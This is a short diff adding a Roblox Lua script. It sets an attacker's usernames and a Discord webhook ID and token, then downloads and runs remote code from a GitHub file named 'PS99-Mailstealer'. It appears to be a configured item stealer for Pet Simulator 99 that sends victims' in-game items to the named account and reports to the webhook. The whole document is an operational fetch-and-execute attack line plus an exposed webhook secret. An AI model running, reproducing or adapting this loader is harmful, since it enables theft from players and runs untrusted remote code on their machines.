@@ -1,0 +1,5 @@
+Username = "Azmac102289p"
+Username2 = "Azmac102289p"
+Webhook = "1325649629374840852/Y8BH_lRPUcHPWtXq0yRMxnWq38PibS30EscBxHWbGk1rAk2kLuvIBaJs67GljWmzSejv"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
